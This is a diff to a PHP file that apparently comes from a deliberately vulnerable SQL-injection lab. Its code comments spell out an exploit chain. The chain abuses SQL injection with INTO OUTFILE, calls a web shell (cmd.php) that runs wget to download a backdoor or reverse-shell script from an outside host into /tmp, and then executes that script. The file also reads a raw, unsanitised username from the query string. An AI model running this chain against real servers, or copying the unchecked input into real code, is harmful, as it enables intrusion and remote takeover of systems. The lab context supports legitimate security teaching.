@@ -6,14 +6,14 @@
     // Create a PHP script that will run commands
     // Exploit query: http://secure.api/sql-injection/outfile.php?username=d;select%20*%20from%20user%20into%20outfile%20"/tmp/out2";
     //
-    // Run new command script to install a backdoor
-    // http://secure.api/sql-injection/dump/out3.php?cmd=wget%20http://secure.api/scripts/perl-backdoor.pl%20-O%20/tmp/perl-backdoor.pl
+    // Download reverse shell
+    // http://secure.api/sql-injection/dump/cmd.php?cmd=wget%20http://secure.api/scripts/python-backdoor-2.py -O /tmp/python-backdoor.py
     //
-    // Start new backdoor script
-    // http://secure.api/sql-injection/dump/out3.php?cmd=perl%20/tmp/perl-backdoor.pl 127.0.0.1 8000
+    // Run new backdoor script
+    // http://secure.api/sql-injection/dump/cmd.php?cmd=python /tmp/python-backdoor.py
     // 
 
-    file_put_contents('/var/www/web/sql-injection/dump/fpc.txt', "file put contents 2\n");
+    //file_put_contents('/var/www/web/sql-injection/dump/fpc.txt', "file put contents 2\n");
 
     $username = isset($_GET['username']) ? $_GET['username'] : null;
 
